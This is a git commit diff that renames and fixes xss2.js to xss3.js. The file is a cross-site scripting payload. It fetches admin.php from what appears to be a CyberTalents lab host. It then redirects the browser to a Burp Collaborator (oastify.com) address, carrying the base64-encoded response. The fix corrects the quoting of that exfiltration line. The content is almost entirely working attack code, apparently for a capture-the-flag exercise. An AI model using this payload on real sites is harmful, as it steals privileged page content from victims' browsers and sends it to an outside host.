239e0674a5d541899e3b8f55b55c7ab59cf0b261
meeposf123 <k164018@nu.edu.pk>
2022-12-17 19:18:59 +0500

    Update and rename xss2.js to xss3.js

--- xss3.js
+++ xss3.js
@@ -3,7 +3,7 @@ alert(1);
 
 		  xhr.onreadystatechange = () => {
 		if (xhr.readyState === 4) {
-		  document.location=http://312mnaovipt6hhnrhhug81ucr3xwll.oastify.com?+btoa(xhr.response);
+		  document.location='http://312mnaovipt6hhnrhhug81ucr3xwll.oastify.com?'+btoa(xhr.response);
 		}
 	  }
 	xhr.open('GET','http://pwcom5p6v4ehxzg1rol2z76jum350ndvjeyyie3y4-web.cybertalentslabs.com/admin.php',true);
